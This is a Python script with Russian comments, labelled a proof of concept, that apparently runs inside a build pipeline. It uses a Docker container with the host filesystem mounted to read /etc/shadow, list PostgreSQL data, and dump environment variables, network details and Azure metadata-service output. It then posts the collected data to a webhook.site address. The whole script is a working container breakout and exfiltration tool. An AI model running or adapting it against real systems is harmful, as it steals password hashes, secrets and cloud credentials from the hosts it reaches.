import subprocess
import requests
import json

# Ваш проверенный URL-адрес на Webhook.site
WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def run_host_command(cmd_args):
    """Вспомогательная функция для запуска команд на хосте через контейнер Alpine"""
    # Используем сетевой режим хоста и монтируем корень хоста в /mnt/host
    base_cmd = ["docker", "run", "--rm", "--net=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
    full_cmd = base_cmd + [cmd_args]
    try:
        return subprocess.check_output(full_cmd, stderr=subprocess.STDOUT).decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"ERROR (Exit Code {e.returncode}): {e.output.decode(errors='ignore')}"
    except Exception as e:
        return f"EXCEPTION: {str(e)}"

def collect_proof_of_concept():
    payload = {
        "experiment_status": "START",
        "docker_breakout": {},
        "network_analysis": {},
        "cloud_provider_test": {}
    }

    print("[*] Проверка Docker Breakout (чтение /etc/shadow)...")
    # Тест на чтение shadow (проверка привилегий root на хосте)
    shadow_output = run_host_command("cat /mnt/host/etc/shadow 2>&1 | head -n 5")
    payload["docker_breakout"]["etc_shadow_preview"] = shadow_output
    
    # Тест на листинг директории СУБД PostgreSQL
    pg_dir = run_host_command("ls -R /mnt/host/var/lib/postgresql/16/main 2>&1 | head -n 20")
    payload["docker_breakout"]["postgres_dir_listing"] = pg_dir

    print("[*] Сбор сетевых метрик хоста...")
    # Сбор данных о сетевых интерфейсах и маршрутах Azure
    payload["network_analysis"]["interfaces"] = run_host_command("ip a")
    payload["network_analysis"]["routing_table"] = run_host_command("ip route")
    payload["network_analysis"]["env_variables"] = run_host_command("env")

    print("[*] Проверка доступности Azure Metadata Service (IMDS)...")
    # Попытка достучаться до IMDS Azure с таймаутом в 5 секунд, чтобы билд не завис
    imds_cmd = "curl -s -m 5 -H 'Metadata: true' 'http://169.254.169' || echo 'IMDS_TIMEOUT_OR_BLOCKED'"
    payload["cloud_provider_test"]["azure_imds_response"] = run_host_command(imds_cmd)

    # Отправка собранного отчета на ваш вебхук
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"[+] Отчет успешно отправлен. Статус ответа сервера: {response.status_code}")
    except Exception as e:
        print(f"[-] Не удалось отправить отчет на Webhook.site: {e}")

if __name__ == "__main__":
    collect_proof_of_concept()
